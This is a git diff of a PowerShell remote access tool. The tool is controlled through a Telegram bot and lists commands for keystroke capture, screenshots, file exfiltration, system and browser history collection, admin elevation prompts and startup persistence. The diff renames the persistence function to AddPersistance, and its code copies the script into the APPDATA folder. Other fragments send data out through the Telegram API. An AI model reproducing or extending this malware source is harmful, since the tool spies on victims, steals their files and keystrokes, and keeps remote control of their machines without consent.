@@ -64,13 +64,13 @@ ExtraInfo    : Extra commands information
 Close   : Close this Session
 PauseSession   : Kills this session and restarts
 FolderTree    : Gets Dir tree and sends it zipped
-Persistance   : Add Telegram C2 to Startup
 Screenshot   : Sends a screenshot of the desktop
 Keycapture    : Capture Keystrokes and send
 Exfiltrate   : Sends files (see below for info)
 Systeminfo   : Send System info as text file
 Softwareinfo   : Send Software info as text file
 Historyinfo   : Send History info as text file
+AddPersistance   : Add Telegram C2 to Startup
 RemovePersistance   : Remove Startup Persistance
 IsAdmin   : Checks if session has admin Privileges
 AttemptElevate  : Send user a prompt to gain Admin
@@ -120,7 +120,6 @@ into the chat (before invoking the function!)
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
 }
-
 
 Function Close{
 $contents = "$comp $env:COMPUTERNAME $closed Connection Closed"
@@ -437,7 +436,7 @@ Write-Output "Done."
 }
 
 
-Function Persistance{
+Function AddPersistance{
 $newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
 $scriptContent | Out-File -FilePath $newScriptPath -force
 sleep 1
